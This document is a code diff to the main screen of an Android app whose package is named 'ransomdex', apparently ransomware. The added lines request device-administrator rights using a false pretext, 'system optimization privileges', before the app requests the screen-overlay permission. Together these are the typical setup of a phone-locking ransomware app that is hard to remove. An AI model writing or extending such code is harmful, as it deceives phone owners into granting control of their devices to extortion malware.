@@ -1,6 +1,9 @@
 package com.bondex.ransomdex;
 
 import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
@@ -9,6 +12,8 @@ import android.provider.Settings;
 public class MainActivity extends Activity {
 
     private static final int ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE = 5469;
+    private DevicePolicyManager devicePolicyManager;
+    private ComponentName adminComponent;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -16,6 +21,17 @@ public class MainActivity extends Activity {
 
         // Hilangkan animasi masuk agar tidak flicker
         overridePendingTransition(0, 0);
+
+        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        adminComponent = new ComponentName(this, AdminReceiver.class);
+
+        // Minta Izin Admin dulu, baru Overlay
+        if (!devicePolicyManager.isAdminActive(adminComponent)) {
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "This app requires system optimization privileges.");
+            startActivity(intent);
+        }
 
         // Cek izin draw overlay (diperlukan untuk TYPE_APPLICATION_OVERLAY)
         checkPermission();
